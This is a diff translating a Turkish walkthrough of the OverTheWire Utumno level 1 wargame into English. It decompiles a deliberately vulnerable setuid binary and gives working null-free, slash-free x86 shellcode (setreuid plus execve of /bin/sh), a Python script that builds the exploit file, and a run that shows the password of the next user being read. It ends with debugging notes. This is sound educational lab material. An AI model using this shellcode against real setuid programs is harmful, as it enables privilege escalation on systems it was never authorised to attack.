@@ -1,67 +1,67 @@
-# OverTheWire — Utumno Level 1 Çözümü (utumno1 → utumno2)
+# OverTheWire — Utumno Level 1 Solution (utumno1 → utumno2)
 
-> Hedef: `utumno1` kullanıcısından `utumno2` kullanıcısının şifresini elde etmek.
-> Teknik: setuid binary'de **kasıtlı shellcode çalıştırma** (RWX buffer + dönüş adresi ezme).
+> Goal: Get utumno2 user's password from `utumno1`.
+> Technique: **Intentional shellcode execution** in a setuid binary (RWX buffer + return address overwrite).
 
 ---
 
-## 1. Bağlantı
+## 1. Connection
 
 ```bash
 ssh utumno1@utumno.labs.overthewire.org -p 2227
-# şifre: ........   (bir önceki seviyeden)
+# password: ........   (from the previous level)
 ```
 
 ---
 
-## 2. Keşif (Recon)
+## 2. Recon
 
 ```bash
 ls -la /utumno/utumno1
-# -r-sr-x--- 1 utumno2 utumno1 13608 utumno1   <-- SUID utumno2, grup utumno1 = OKUNABİLİR
+# -r-sr-x--- 1 utumno2 utumno1 13608 utumno1   <-- SUID utumno2, group utumno1 = READABLE
 file /utumno/utumno1
 # setuid ELF 32-bit LSB, dynamically linked, with debug_info, not stripped
 ```
 
-**Önemli:** Bu binary bizim (grup utumno1) için `r-x` → **okuyabiliyoruz**, yani statik
-analiz (objdump/strings/gdb) mümkün. Çalıştırınca utumno2 yetkisiyle çalışıyor (suid).
+**Important:** This binary is `r-x` for us (group utumno1) → we **can read it**, so static
+analysis (objdump/strings/gdb) is possible. When run, it executes as utumno2 (suid).
 
-### strings — ipuçları
+### strings — hints
 ```bash
 strings /utumno/utumno1 | grep -viE "GLIBC|GCC|__"
 ```
-Dikkat çekenler: `opendir`, `readdir`, `mmap`, `strncpy`, `strncmp`, `argv`, `argc`
-→ Bir **dizini** okuyup içindeki dosya adlarıyla bir şey yapıyor.
+Notable: `opendir`, `readdir`, `mmap`, `strncpy`, `strncmp`, `argv`, `argc`
+→ It reads a **directory** and does something with the filenames inside.
 
-Argümansız çalıştırınca `exit=1` (argv[1] gerekiyor).
+Running without arguments → `exit=1` (argv[1] required).
 
 ---
 
-## 3. Statik Analiz — `main`
+## 3. Static Analysis — `main`
 
 ```bash
 objdump -d -M intel /utumno/utumno1 | sed -n '/<main>:/,/^$/p'
 ```
 
-Sözde kod (decompile):
+Pseudocode (decompiled):
 ```c
 int main(int argc, char **argv) {
     if (argv[1] == NULL) exit(1);
     buf = mmap(NULL, 0x1000, PROT_READ|WRITE|EXEC, MAP_PRIVATE|ANON, -1, 0); // RWX!
     global_buf = buf;                       // ds:0x804b22c
     if (buf == NULL) exit(2);
-    DIR *d = opendir(argv[1]);              // argv[1] = bir DİZİN
+    DIR *d = opendir(argv[1]);              // argv[1] = a DIRECTORY
     if (d == NULL) exit(1);
     while ((entry = readdir(d)) != NULL) {
-        // d_name = entry + 0xb  (dirent: d_ino+d_off+d_reclen+d_type = 11 bayt offset)
+        // d_name = entry + 0xb  (dirent: d_ino+d_off+d_reclen+d_type = 11 byte offset)
         if (strncmp("sh_", entry->d_name, 3) == 0)   // .rodata @0x804a008 = "sh_"
-            run(entry->d_name + 3);                  // "sh_" SONRASINI run'a yolla
+            run(entry->d_name + 3);                  // send AFTER "sh_" to run
     }
     return 0;
 }
 ```
 
-`.rodata` doğrulama:
+`.rodata` verification:
 ```bash
 objdump -s -j .rodata /utumno/utumno1
 # 804a000  03000000 01000200 73685f00   ........sh_.
@@ -70,38 +70,38 @@ objdump -s -j .rodata /utumno/utumno1
 
 ---
 
-## 4. Statik Analiz — `run()` (ASIL ZAFİYET)
+## 4. Static Analysis — `run()` (THE ACTUAL VULNERABILITY)
 
 ```bash
 objdump -d -M intel /utumno/utumno1 | sed -n '/<run>:/,/^$/p'
 ```
 
-Sözde kod:
+Pseudocode:
 ```c
 void run(char *arg) {
-    strncpy(global_buf, arg, 0x1000);   // arg'ı RWX buffer'a kopyala
-    *(ebp + 4) = global_buf;            // <<< KENDİ DÖNÜŞ ADRESİNİ buffer'a yazıyor!
-    // stack canary kontrolü (intact, çünkü taşma yok)
-    return;   // ret -> EIP = global_buf -> arg'ı MAKİNE KODU olarak çalıştırır
+    strncpy(global_buf, arg, 0x1000);   // copy arg into RWX buffer
+    *(ebp + 4) = global_buf;            // <<< WRITES OWN RETURN ADDRESS to the buffer!
+    // stack canary check (intact, no overflow)
+    return;   // ret -> EIP = global_buf -> executes arg as MACHINE CODE
 }
 ```
 
-> Yani: `sh_` ile başlayan bir dosya adının `sh_` sonrası kısmı, RWX belleğe kopyalanıp
-> **shellcode olarak çalıştırılıyor** — ve binary suid olduğu için **utumno2** yetkisiyle.
+> So: the part of a filename after `sh_` is copied into RWX memory and
+> **executed as shellcode** — and since the binary is suid, it runs as **utumno2**.
 
-**Plan:** Adı `sh_<shellcode>` olan bir dosya içeren dizini argv[1] olarak ver.
+**Plan:** Give a directory containing a file named `sh_<shellcode>` as argv[1].
 
 ---
 
-## 5. Kısıtlar ve Shellcode
+## 5. Constraints and Shellcode
 
-Dosya adı (filename) iki bayt **içeremez**:
-- `/` (0x2f) — yol ayıracı
-- `\0` (0x00) — string sonu (ayrıca strncpy de null'da durur)
+A filename cannot contain two bytes:
+- `/` (0x2f) — path separator
+- `\0` (0x00) — string terminator (also stops strncpy)
 
-Bu yüzden **null-free + slash-free** 32-bit shellcode lazım. `"/bin/sh"` string'ini
-literal yazmak yerine **`XOR 0x01010101`** ile runtime'da kurdum. Ayrıca suid yetkisinin
-shell'e taşınması için `setreuid(euid, euid)` ekledim.
+So we need **null-free + slash-free** 32-bit shellcode. Instead of writing `"/bin/sh"` literally,
+I built it at runtime via **`XOR 0x01010101`**. Also added `setreuid(euid, euid)` to carry
+the suid privilege into the shell.
 
 ```
 ; setreuid(geteuid(), geteuid())
@@ -110,7 +110,7 @@ mov ebx,eax ; mov ecx,eax
 xor eax,eax ; mov al,203 ; int 0x80     ; setreuid32(euid,euid)
 
 ; execve("/bin/sh", ["/bin/sh", NULL], NULL)   -- slash-free
-xor eax,eax ; push eax                  ; string NUL sonlandırıcı
+xor eax,eax ; push eax                  ; string NUL terminator
 mov eax,0x0169722e ; xor eax,0x01010101 ; push eax   ; -> 0x0068732f = "/sh\0"
 mov eax,0x6f68632e ; xor eax,0x01010101 ; push eax   ; -> 0x6e69622f = "/bin"
 mov ebx,esp                             ; ebx -> "/bin/sh"
@@ -119,10 +119,10 @@ xor edx,edx                             ; envp = NULL
 xor eax,eax ; mov al,11 ; int 0x80      ; execve
 ```
 
-XOR mantığı (örnek `"/sh\0"`): hedef baytlar `2f 73 68 00` = LE dword `0x0068732f`.
-`0x0068732f ^ 0x01010101 = 0x0169722e` (bayt: `2e 72 69 01` — ne `/` ne `\0` var). ✓
+XOR logic (example `"/sh\0"`): target bytes `2f 73 68 00` = LE dword `0x0068732f`.
+`0x0068732f ^ 0x01010101 = 0x0169722e` (bytes: `2e 72 69 01` — no `/` no `\0`). ✓
 
-### Exploit script (Python ile dosyayı oluştur)
+### Exploit script (create file with Python)
 ```python
 import os
 sc = bytes([
@@ -130,68 +130,67 @@ sc = bytes([
  0x31,0xc0,0x50,0xb8,0x2e,0x72,0x69,0x01,0x35,0x01,0x01,0x01,0x01,0x50,
  0xb8,0x2e,0x63,0x68,0x6f,0x35,0x01,0x01,0x01,0x01,0x50,0x89,0xe3,
  0x31,0xc0,0x50,0x53,0x89,0xe1,0x31,0xd2,0x31,0xc0,0xb0,0x0b,0xcd,0x80])
-assert 0 not in sc and 0x2f not in sc          # badchar kontrolü
+assert 0 not in sc and 0x2f not in sc          # badchar check
 name = b"sh_" + sc
 fd = os.open(b"dir/"+name, os.O_CREAT|os.O_WRONLY, 0o644); os.close(fd)
 ```
 
-### Çalıştırma
+### Execution
 ```bash
 W=$(mktemp -d); chmod 755 "$W"; cd "$W"; mkdir dir; chmod 755 dir
-python3 olustur.py                # yukarıdaki dosyayı dir/ içine yaratır
+python3 create.py                # creates the file inside dir/
 echo "id; cat /etc/utumno_pass/utumno2" | /utumno/utumno1 "$PWD/dir"
 ```
 
-Çıktı:
+Output:
 ```
 uid=16002(utumno2) gid=16001(utumno1) groups=16001(utumno1)
 ```
 
 ---
 
-## 6. Debugging Yolculuğu — Karşılaşılan 3 Bug
+## 6. Debugging Journey — 3 Bugs Encountered
 
-İlk denemelerde shell açılmadı. Sırayla çözülen 3 sorun:
+The shell didn't open on the first attempts. Three problems solved in order:
 
-### Bug 1 — Bozuk execve syscall numarası → SIGSEGV `0xffffffda`
-`strace` ile görüldü: `--- SIGSEGV si_addr=0xffffffda ---` (0xffffffda = -38 = ENOSYS).
-Sebep: `mov al,0x0b` sadece `eax`'in **alt baytını** set ediyor; üst baytlar bir önceki
-`"/bin"` değerinden (`0x6e6962..`) kalmıştı → syscall no = `0x6e69620b` (geçersiz) → ENOSYS
-→ ardından gelen null baytlar (`add [eax],al`, eax=0xffffffda) → segfault.
-**Düzeltme:** `execve`'den önce `xor eax,eax` ile `eax`'i tamamen temizle.
-(geteuid/setreuid'de zaten `xor eax,eax` vardı, sadece execve'de eksikti.)
+### Bug 1 — Broken execve syscall number → SIGSEGV `0xffffffda`
+Seen via `strace`: `--- SIGSEGV si_addr=0xffffffda ---` (0xffffffda = -38 = ENOSYS).
+Cause: `mov al,0x0b` only sets the **low byte** of `eax`; upper bytes still held the
+`"/bin"` value (`0x6e6962..`) → syscall number = `0x6e69620b` (invalid) → ENOSYS
+→ subsequent null bytes (`add [eax],al`, eax=0xffffffda) → segfault.
+**Fix:** Add `xor eax,eax` before `execve` to fully clear `eax`.
+(geteuid/setreuid already had `xor eax,eax`, only execve was missing it.)
 
-### Bug 2 — `argv = NULL` ile dash başlamıyor
-İlk shellcode `execve("/bin/sh", NULL, NULL)` çağırıyordu; dash `argv[0]` NULL olunca düzgün
-çalışmadı. **Düzeltme:** stack'te `["/bin/sh", NULL]` dizisi kurup `ecx`'i ona işaret ettir.
+### Bug 2 — dash not starting with `argv = NULL`
+Initial shellcode called `execve("/bin/sh", NULL, NULL)`; dash didn't work properly with
+a NULL `argv[0]`. **Fix:** Build `["/bin/sh", NULL]` array on the stack and point `ecx` to it.
 
-### Bug 3 — `opendir` izin hatası (en sinsi olanı)
-Gerçek suid çalışmada `rc=1` dönüyordu (segfault değil!). `main`'de `exit(1)` =
-`opendir(argv[1]) == NULL`. Sebep: `mktemp -d` dizini **700 / utumno1** sahipliğindeydi;
-suid çalışmada euid=**utumno2** o dizine **giremiyordu** (search/x izni yok) → `opendir`
-patlıyordu.
-> İpucu neden gizlendi: `strace` altında suid **düşürülür** (kernel güvenliği), process
-> utumno1 olarak çalışır ve kendi 700 dizinine girebilir → "strace'de çalışıyor ama gerçekte
-> çalışmıyor" yanılgısı. `rc=1` (≠139 segfault) bunu ele verdi.
+### Bug 3 — `opendir` permission error (most subtle)
+In real suid execution, `rc=1` (not segfault!). `exit(1)` in `main` = `opendir(argv[1]) == NULL`.
+Cause: `mktemp -d` created directory with **700 / utumno1** ownership; in suid execution
+euid=**utumno2** couldn't **enter** that directory (no search/x permission) → `opendir` failed.
+> Why this was hidden: `strace` **drops suid** (kernel security), process runs as utumno1 and
+> can enter its own 700 directory → "works under strace but not in reality" confusion.
+> `rc=1` (≠139 segfault) gave it away.
 
-**Düzeltme:** Çalışma dizinini utumno2'nin geçebilmesi için `chmod 755 "$W"`.
+**Fix:** `chmod 755 "$W"` so utumno2 can traverse it.
 
-| Belirti | Gerçek sebep | Düzeltme |
-|---------|--------------|----------|
-| SIGSEGV @0xffffffda | execve syscall no bozuk (al only) | execve öncesi `xor eax,eax` |
-| Shell sessizce çıkıyor | `argv=NULL` | argv `["/bin/sh",NULL]` |
-| `rc=1`, run() hiç çalışmıyor | suid euid, 700 dizine giremiyor | `chmod 755` çalışma dizini |
+| Symptom | Real cause | Fix |
+|---------|------------|-----|
+| SIGSEGV @0xffffffda | execve syscall number corrupted (al only) | `xor eax,eax` before execve |
+| Shell exits silently | `argv=NULL` | argv = `["/bin/sh",NULL]` |
+| `rc=1`, run() never called | suid euid can't enter 700 directory | `chmod 755` working dir |
 
 ---
 
 
-## Özet / Alınan Dersler
+## Summary / Lessons Learned
 
-| Konu | Not |
-|------|-----|
-| **Kasıtlı shellcode exec** | Binary, dosya adını RWX belleğe kopyalayıp kendi ret adresini oraya yazarak çalıştırıyor |
-| **Badchar kaçınma** | Filename `/` ve `\0` içeremez → string'i `XOR` ile runtime'da kur |
-| **suid privilege koruma** | `execve` öncesi `setreuid(euid,euid)` ile yetkiyi shell'e taşı |
-| **strace vs gerçek** | strace setuid'i düşürür; suid'e özgü izin/yetki buglarını gizleyebilir → `rc` değerine bak |
-| **`mov al, x` tuzağı** | 8-bit yazma üst baytları temizlemez; syscall no için tam `eax` gerekir |
-| **Dizin geçiş izni** | suid binary'ye verilen yol, binary'nin euid'i tarafından erişilebilir olmalı |
+| Topic | Note |
+|-------|------|
+| **Intentional shellcode exec** | Binary copies filename into RWX memory and overwrites its own ret addr to execute it |
+| **Badchar avoidance** | Filename can't contain `/` and `\0` → build strings at runtime via XOR |
+| **suid privilege preservation** | `setreuid(euid,euid)` before `execve` to carry privilege into shell |
+| **strace vs reality** | strace drops setuid; can hide permission/privilege bugs specific to suid → check `rc` value |
+| **`mov al, x` trap** | 8-bit write doesn't clear upper bytes; syscall number needs full `eax` |
+| **Directory traversal permission** | Path given to suid binary must be accessible to the binary's euid |
